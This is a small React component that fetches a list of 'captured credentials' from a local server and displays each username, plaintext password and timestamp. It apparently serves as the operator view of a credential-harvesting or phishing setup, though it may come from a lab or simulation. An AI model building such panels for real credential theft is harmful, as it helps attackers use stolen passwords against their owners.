import React, { useEffect, useState } from 'react';

function CapturedDataDashboard() {
  const [data, setData] = useState([]);

  useEffect(() => {
    fetch("http://localhost:8000/captured_credentials")
      .then(res => res.json())
      .then(setData)
      .catch(err => console.error("Failed to fetch:", err));
  }, []);

  return (
    <div>
      <h2>Captured Credentials</h2>
      <ul>
        {data.map((entry, i) => (
          <li key={i}>
            <strong>{entry.username}</strong> - {entry.password} ({entry.timestamp})
          </li>
        ))}
      </ul>
    </div>
  );
}

export default CapturedDataDashboard;
